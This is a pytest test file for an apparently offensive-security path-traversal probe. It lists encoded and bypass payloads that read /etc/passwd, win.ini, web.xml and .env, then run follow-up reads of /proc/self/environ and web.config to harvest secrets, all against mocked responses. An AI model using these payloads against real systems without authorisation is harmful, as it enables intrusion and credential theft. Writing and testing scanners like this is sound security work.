"""
Unit tests for path_traversal_probe adapter.
"""
from __future__ import annotations

from unittest.mock import MagicMock

import pytest
import requests

from tradecraft.adapters.path_traversal_probe import execute as trav_execute
from tradecraft.adapters.path_traversal_probe import parse as trav_parse


def test_build_traversal_payloads_count():
    payloads = trav_parse.build_traversal_payloads()
    assert len(payloads) == 10
    strings = [p[0] for p in payloads]
    assert "../../../../../../../etc/passwd" in strings
    assert "..\\..\\..\\..\\..\\..\\windows\\win.ini" in strings


def test_build_probe_url_adds_parameter():
    url = trav_parse.build_probe_url("https://example.com/download", "file", "../../../../etc/passwd")
    assert "file=" in url
    assert "etc/passwd" in url


def test_build_probe_url_preserves_existing_params_and_does_not_double_encode():
    url = trav_parse.build_probe_url(
        "https://example.com/download?lang=en", "file", "..%2f..%2fetc%2fpasswd"
    )
    assert "lang=en" in url
    # The literal %2f sequence must survive unmangled, not be re-encoded to %252f.
    assert "%2f" in url
    assert "%252f" not in url


def test_check_traversal_response():
    assert trav_parse.check_traversal_response("root:x:0:0:root:/root:/bin/bash", "root:x:0:0:") is True
    assert trav_parse.check_traversal_response("hello world", "root:x:0:0:") is False
    assert trav_parse.check_traversal_response("", "root:x:0:0:") is False


def test_find_confirmed_probe():
    payloads = trav_parse.build_traversal_payloads()
    probes = [
        trav_parse.RawTraversalProbe(payload=payloads[0][0], file_description=payloads[0][1], body="nothing here"),
        trav_parse.RawTraversalProbe(payload=payloads[1][0], file_description=payloads[1][1], body="root:x:0:0:yes"),
    ]
    match = trav_parse.find_confirmed_probe(probes, payloads)
    assert match is not None
    probe, style, depth = match
    assert probe.payload == payloads[1][0]
    assert style == "url_encoded"
    assert depth == 6


def test_find_confirmed_probe_none():
    payloads = trav_parse.build_traversal_payloads()
    probes = [trav_parse.RawTraversalProbe(payload=payloads[0][0], file_description=payloads[0][1], body="clean")]
    assert trav_parse.find_confirmed_probe(probes, payloads) is None


# ---------------------------------------------------------------- styles / follow-up


def test_all_ten_original_payloads_reproduced_exactly():
    payloads = trav_parse.build_traversal_payloads()
    assert [p[0] for p in payloads] == [
        "../../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "/etc/passwd",
        "....//....//....//....//....//....//etc/passwd",
        "../../../../../../WEB-INF/web.xml",
        "../../../../../../.env",
    ]


def test_build_followup_payloads_unix_family():
    payloads = trav_parse.build_followup_payloads("raw", 7)
    assert payloads[0][0] == "../../../../../../../proc/self/environ"
    assert payloads[0][2] == "PATH="
    assert len(payloads) == len(trav_parse.UNIX_FOLLOWUP_FILES)


def test_build_followup_payloads_windows_family():
    payloads = trav_parse.build_followup_payloads("backslash", 6)
    assert payloads[0][0] == "..\\..\\..\\..\\..\\..\\inetpub\\wwwroot\\web.config"
    assert payloads[0][2] == "<configuration"
    assert len(payloads) == len(trav_parse.WINDOWS_FOLLOWUP_FILES)


def test_build_followup_payloads_backslash_encoded_also_windows_family():
    payloads = trav_parse.build_followup_payloads("backslash_encoded", 6)
    assert "inetpub%5cwwwroot%5cweb.config" in payloads[0][0]


def test_build_followup_payloads_absolute_style_ignores_depth():
    payloads = trav_parse.build_followup_payloads("absolute", 99)
    assert payloads[0][0] == "/proc/self/environ"


def test_execute_empty_target():
    res = trav_execute.execute(target="", parameter="file")
    assert res.error == "empty target URL"


def test_execute_missing_parameter():
    res = trav_execute.execute(target="https://example.com", parameter="")
    assert res.error == "missing required parameter"


def test_execute_confirmed_stops_early_then_harvests_followups():
    mock_session = MagicMock()
    resp = MagicMock()
    resp.status_code = 200
    resp.url = "https://example.com/download?file=../../../../../../../etc/passwd"
    resp.text = "root:x:0:0:root:/root:/bin/bash\n"
    mock_session.get.return_value = resp

    res = trav_execute.execute(
        target="https://example.com/download", parameter="file", session=mock_session
    )

    assert res.tested_count == 1
    assert len(res.probes) == 1
    assert res.probes[0].body.startswith("root:x:0:0:")
    assert res.probes[0].confirmed is True
    assert res.confirmed_style == "raw"
    assert res.confirmed_depth == 7
    # Unix family follow-up ran, but none matched this mock's fixed body.
    assert len(res.followup_probes) == len(trav_parse.UNIX_FOLLOWUP_FILES)
    assert all(p.confirmed is False for p in res.followup_probes)


def test_execute_followup_confirms_real_match():
    mock_session = MagicMock()
    sweep_resp = MagicMock()
    sweep_resp.status_code = 200
    sweep_resp.text = "root:x:0:0:root:/root:/bin/bash\n"
    environ_resp = MagicMock()
    environ_resp.status_code = 200
    environ_resp.text = "PATH=/usr/bin\x00SECRET_KEY=abc123\x00"
    mock_session.get.side_effect = [sweep_resp, environ_resp] + [sweep_resp] * 8

    res = trav_execute.execute(
        target="https://example.com/download", parameter="file", session=mock_session
    )

    assert res.followup_probes[0].file_description == "Process environment variables (proc/self/environ)"
    assert res.followup_probes[0].confirmed is True


def test_execute_no_confirmation_tries_all_payloads_and_no_followups():
    mock_session = MagicMock()
    resp = MagicMock()
    resp.status_code = 200
    resp.url = "https://example.com/download"
    resp.text = "<html>clean page</html>"
    mock_session.get.return_value = resp

    res = trav_execute.execute(
        target="https://example.com/download", parameter="file", session=mock_session
    )

    assert res.tested_count == 10
    assert len(res.probes) == 10
    assert res.confirmed_style is None
    assert res.followup_probes == []


def test_execute_request_exception_continues():
    mock_session = MagicMock()
    ok_resp = MagicMock()
    ok_resp.status_code = 200
    ok_resp.url = "https://example.com/download"
    ok_resp.text = "clean"
    mock_session.get.side_effect = [
        requests.RequestException("timed out"),
        ok_resp,
    ] + [ok_resp] * 8

    res = trav_execute.execute(
        target="https://example.com/download", parameter="file", session=mock_session
    )

    assert res.tested_count == 10
    assert res.probes[0].error == "timed out"
